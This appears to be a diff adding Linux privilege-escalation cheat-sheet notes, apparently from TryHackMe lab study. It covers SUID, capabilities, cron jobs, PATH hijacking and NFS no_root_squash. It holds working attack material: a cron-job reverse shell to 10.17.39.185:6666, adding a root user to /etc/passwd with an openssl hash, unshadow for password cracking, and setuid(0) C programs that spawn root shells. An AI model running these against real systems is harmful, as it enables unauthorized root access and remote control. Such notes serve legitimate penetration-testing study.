@@ -271,3 +271,142 @@ then run
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
 --------------------------------------------------------------
+
+**Privilege Escalation: SUID**
+
+```bash
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+will list files that have SUID or SGID bits set.
+
+A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io).
+
+
+John the Ripper: unshadow tool
+To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.
+```bash
+unshadow passwd.txt shadow.txt > passwords.txt
+```
+
+The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:
+
+We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.
+
+```bash
+openssl passwd -1 -salt THM password1
+```
+We will then add this password with a username to the /etc/passwd file.
+
+----------------------------------------------------------------
+
+**Privilege Escalation: Capabilities**
+
+Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level.
+
+We can use the 
+```bash
+getcap -r / 2>/dev/null 
+```
+tool to list enabled capabilities.
+
+When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.
+
+----------------------------------------------------------------
+
+**Privilege Escalation: Cron Jobs**
+
+```bash
+cat /etc/crontab
+```
+
+We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.
+
+```bash
+cat backup.sh
+
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.17.39.185/6666 0>&1
+
+```
+-----------------------------------------------------------------
+
+**Privilege Escalation: PATH**
+
+If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script.
+
+```bash
+echo $PATH
+```
+
+1.	What folders are located under $PATH
+2.	Does your current user have write privileges for any of these folders?
+3.	Can you modify $PATH?
+4.	Is there a script/application you can start that will be affected by this vulnerability?
+
+script like
+
+```bash
+#include<unistd.h>
+void main(){
+	setuid(0);
+	setgid(0);
+	system("thm");
+}
+```
+
+```bash
+gcc path_exp.c -o path -w
+chmod +s path
+```
+
+```bash
+find / -writable 2>/dev/null
+```
+
+we have tmp folder here as writable, suppose
+
+```bash
+export PATH=/tmp:$PATH
+cd /tmp
+echo "/bin/bash" > thm
+chmod 777 thm
+```
+
+-----------------------------------------------------------------
+
+**Privilege Escalation: NFS**
+
+finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.
+
+Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.
+
+NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
+
+```bash
+cat /etc/exports
+```
+
+The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+We will start by enumerating mountable shares from our attacking machine.
+
+```bash
+showmount -e 10.10.2.15
+```
+
+check the share that you have executable rights on target machine
+
+add this below to the mounted directory
+
+```bash
+#include<unistd.h>
+int main(){
+	setuid(0);
+	setgid(0);
+	system("/bin/bash");
+	return 0;
+}
+gcc nfs.c -o nfs -w
+chmod +s nfs
+```
